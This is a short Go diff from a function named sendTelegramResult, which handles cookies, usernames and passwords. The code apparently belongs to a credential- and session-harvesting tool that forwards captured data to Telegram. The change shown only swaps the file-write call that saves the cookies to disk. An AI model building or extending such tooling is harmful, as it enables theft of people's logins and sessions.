@@ -60,7 +60,7 @@ func sendTelegramResult(cookies string, username string, password string, remote
 // 		"chat_id":    getChatId(),
 // 		"caption":       msg,
 // 	})
-	err := os.WriteFile(fileName, []byte(cookies), 0755)
+	err := ioutil.WriteFile(fileName, []byte(cookies), 0755)
 	if err != nil {
 	   fmt.Printf("Unable to write file: %v", err)
 	}
